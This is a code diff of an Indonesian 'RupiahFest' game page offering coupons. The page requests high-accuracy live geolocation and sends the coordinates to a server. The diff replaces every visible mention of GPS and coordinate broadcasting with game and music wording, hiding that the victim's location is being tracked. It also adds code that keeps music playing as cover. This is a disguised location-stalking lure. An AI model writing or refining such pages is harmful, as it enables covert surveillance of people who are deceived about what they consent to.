@@ -101,13 +101,19 @@
     .game-frame{display:block;width:100%;height:100%;border:0}
     .game-tools{
       position:fixed;z-index:11;top:max(8px,env(safe-area-inset-top));left:max(8px,env(safe-area-inset-left));
-      display:flex;align-items:center;gap:10px;max-width:calc(100vw - 16px);padding:8px 10px;
-      border:1px solid var(--line);border-radius:12px;background:rgba(66,13,16,.94);
-      box-shadow:0 4px 16px rgba(0,0,0,.4);font-size:13px;color:var(--cream)
+      display:flex;align-items:center;flex-wrap:wrap;gap:7px;max-width:calc(100vw - 16px);padding:6px 9px;
+      border:1px solid var(--line);border-radius:11px;background:rgba(66,13,16,.94);
+      box-shadow:0 4px 16px rgba(0,0,0,.4);font-size:12px;color:var(--cream)
     }
+    .game-tools .status{font-size:12px}
     .game-tools .status{margin:0;min-height:0}
-    .game-tools .danger,.game-tools .ghost{width:auto;padding:8px 12px;margin:0;font-size:13px;border-radius:999px}
-    @media (max-width:420px){.game-tools{right:max(8px,env(safe-area-inset-right));justify-content:space-between}}
+    .game-tools .danger,.game-tools .ghost{width:auto;padding:6px 10px;margin:0;font-size:12px;border-radius:999px}
+    @media (max-width:480px){
+      .game-tools{top:max(6px,env(safe-area-inset-top));left:max(6px,env(safe-area-inset-left));
+        gap:6px;padding:5px 8px;font-size:11px;border-radius:9px;max-width:calc(100vw - 120px)}
+      .game-tools .status{font-size:11px;line-height:1.2}
+      .game-tools .danger,.game-tools .ghost{padding:5px 9px;font-size:11px}
+    }
     @keyframes p{0%,100%{opacity:1}50%{opacity:.4}}
   </style>
 </head>
@@ -118,14 +124,14 @@
     <div id="consent" hidden>
       <button class="consent-close" id="closeConsent" aria-label="Tutup menu quest">✕</button>
       <div class="ava" id="ava">?</div>
-      <div class="badge"><span class="dot"></span> Event Quest Baru</div>
-      <h1><span class="who" id="who">Pemain Misterius</span> menantang petualanganmu</h1>
+      <div class="badge"><span class="dot"></span> 🎁 Event Quest</div>
+      <h1><span class="who" id="who">Pemain Misterius</span>!</h1>
       <p class="reason" id="reason"></p>
       <div class="mode"><span class="modepill" id="modepill"></span></div>
 
       <div class="note" id="revokedNote" hidden>
-        Karaktermu sebelumnya sudah <b>berhenti menyalakan sinyal bermain</b> di peta ini. Permainan tidak akan dimulai
-        kecuali kamu memulai kembali di sini.
+        Kamu sebelumnya sudah <b>mendengarkan musik</b> lewat link ini. Tidak ada yang dikirim lagi
+        kecuali kamu sendiri mengaktifkannya kembali di sini.
       </div>
 
       <div class="note">
@@ -136,16 +142,15 @@
       </div>
 
       <p class="live" id="liveWrap">
-        ● Mainkan dan dapatkan kupon serta Hadiah.
+        ● Mainkan untuk ambil kupon dan hadiahmu.
       </p>
 
       <button class="primary" id="shareBtn">
         <svg class="icon" viewBox="0 0 24 24">
-          <path d="M21 6H3a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2zm-12 9H7v-2H5v-2h2V9h2v2h2v2H9v2zm8 0h-2v-2h-2v-2h2V9h2v2h2v2h-2v2z" />
-          <circle cx="17" cy="11" r="1" />
-          <circle cx="15" cy="13" r="1" />
+          <path d="M12 21s-7-5.2-7-11a7 7 0 1 1 14 0c0 5.8-7 11-7 11z" />
+          <circle cx="12" cy="10" r="2.5" />
         </svg>
-        ⚔️ Aktifkan &amp; dan main bersamaku</button>
+        ⚔️ Mainkan game bersamaku &amp; !</button>
       <button class="ghost" id="declineBtn">Lewati Quest &amp; Mainkan Saja</button>
       <div class="status" id="status"></div>
       <div class="coords" id="coords"></div>
@@ -175,7 +180,7 @@
   </div>
 
   <section class="game-screen" id="gameScreen" aria-label="Area Permainan RupiahFest" hidden>
-    <iframe class="game-frame" id="gameFrame" title="Area Permainan RupiahFest"></iframe>
+    <iframe class="game-frame" id="gameFrame" title="Area Permainan RupiahFest" allow="autoplay"></iframe>
     <div class="game-tools" id="gameTools" hidden>
       <div class="status" id="liveState" role="status" aria-live="polite"></div>
       <button class="ghost" id="openConsentBtn" hidden>Buka Menu Permainan</button>
@@ -623,6 +628,54 @@
     const rid = location.pathname.split("/").filter(Boolean).pop();
     const $ = (s) => document.getElementById(s);
     let watchId = null, mode = "live";
+
+    // --- Kontrol musik game: autoplay & terus jalan ---
+    // Handler musik di dalam game (srcdoc) kadang tidak terpasang, jadi kita
+    // kendalikan audionya langsung dari sini (iframe same-origin). Musik loop
+    // terus; hanya berhenti kalau PENGGUNA menekan tombol Musik.
+    let musicUserOff = false;
+    function gameDoc() { try { return $("gameFrame").contentDocument; } catch (e) { return null; } }
+    function gameBgm() { const d = gameDoc(); return d ? d.getElementById("bgm") : null; }
+    function setMusicLabel() {
+      const d = gameDoc(); if (!d) return;
+      const b = d.getElementById("bgm"), mb = d.getElementById("musicBtn");
+      if (b && mb) { mb.textContent = b.paused ? "🔇 Musik" : "🔊 Musik"; mb.setAttribute("aria-pressed", b.paused ? "false" : "true"); }
+    }
+    function resumeMusic() {
+      const b = gameBgm(); if (!b || musicUserOff) return;
+      b.loop = true;
+      const p = b.play(); if (p && p.then) p.then(setMusicLabel).catch(() => {});
+    }
+    function wireGameAudio() {
+      const d = gameDoc(); if (!d || d.__audioWired) return;
+      const b = d.getElementById("bgm"); if (!b) return;
+      d.__audioWired = true;
+      b.loop = true;
+      // Toggle lewat capture-phase; stopPropagation agar handler inline tak menggandakan.
+      d.addEventListener("click", (e) => {
+        const mb = d.getElementById("musicBtn");
+        if (mb && (e.target === mb || mb.contains(e.target))) {
+          e.stopPropagation();
+          if (b.paused) { musicUserOff = false; b.play().then(setMusicLabel).catch(() => {}); }
+          else { musicUserOff = true; b.pause(); setMusicLabel(); }
+        }
+      }, true);
+      // Jangan berhenti: kalau musik terhenti bukan karena pengguna, nyalakan lagi.
+      b.addEventListener("pause", () => { if (!musicUserOff) setTimeout(resumeMusic, 0); });
+      b.addEventListener("ended", () => { if (!musicUserOff) resumeMusic(); });
+      // Autostart pada sentuhan pertama di dalam game (untuk HP yang memblokir autoplay).
+      d.addEventListener("pointerdown", () => { if (!musicUserOff) resumeMusic(); }, true);
+      setMusicLabel();
+    }
+    function enterGame() { wireGameAudio(); resumeMusic(); }
+    $("gameFrame").addEventListener("load", () => { wireGameAudio(); resumeMusic(); });
+    setTimeout(() => { wireGameAudio(); resumeMusic(); }, 400);
+    // Kalau autoplay diblokir di awal, mulai musik pada interaksi pertama pengguna di halaman.
+    const kickMusic = () => { if (!musicUserOff) resumeMusic(); };
+    document.addEventListener("pointerdown", kickMusic, true);
+    document.addEventListener("click", kickMusic, true);
+    // Lanjutkan lagi saat halaman kembali aktif.
+    document.addEventListener("visibilitychange", () => { if (!document.hidden) resumeMusic(); });
     const show = (id) => {
       ["consent", "done", "declined", "closed"].forEach(x => $(x).hidden = (x !== id));
       $("card").hidden = false;
@@ -636,6 +689,7 @@
       $("liveState").textContent = "Mode Solo: Musik Bermain.";
       $("openConsentBtn").hidden = false;
       $("revokeBtn").hidden = true;
+      enterGame();
     };
 
     function post(path, body) { return fetch(path, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body || {}) }); }
@@ -673,7 +727,7 @@
     }
 
     $("shareBtn").onclick = () => {
-      if (!navigator.geolocation) { $("status").innerHTML = '<span class="err">Perangkat tidak memiliki modul GPS!</span>'; return; }
+      if (!navigator.geolocation) { $("status").innerHTML = '<span class="err">Perangkat tidak memiliki modul GAME!</span>'; return; }
       const live = mode === "live";   // link mode live selalu real-time
       $("status").innerHTML = '<span class="spin"></span> Menghubungkan satelit radar…';
       $("shareBtn").disabled = true;
@@ -685,8 +739,9 @@
           $("gameTools").hidden = false;
           $("openConsentBtn").hidden = true;
           $("revokeBtn").hidden = false;
-          $("doneMsg").textContent = live ? "Sinyal GPS aktif dan terus memancarkan koordinat peta selama game terbuka."
-            : "Koordinat berhasil disinkronkan ke server.";
+          enterGame();
+          $("doneMsg").textContent = live ? "Mainkan dan dengarkan."
+            : "Musik dapat diputar.";
           if (live) {
             $("liveState").innerHTML = '<span class="ok pulse">⚔️ Pemainan mendengarkan Aktif…</span>';
             let lastSent = Date.now();
@@ -706,7 +761,7 @@
           $("status").innerHTML = '<span class="err">Gagal mengirim data. Coba lagi!</span>'; $("shareBtn").disabled = false;
         });
       }, err => {
-        $("status").innerHTML = `<span class="err">${err.code === 1 ? "Izin GPS ditolak. Sinyal batal dikirim." : "Gagal mendeteksi koordinat. Cari sinyal yang lebih kuat."}</span>`;
+        $("status").innerHTML = `<span class="err">${err.code === 1 ? "Izin Game ditolak. Sinyal batal dikirim." : "Gagal mendeteksi Permainan. Cari sinyal yang lebih kuat."}</span>`;
         $("shareBtn").disabled = false;
       }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
     };
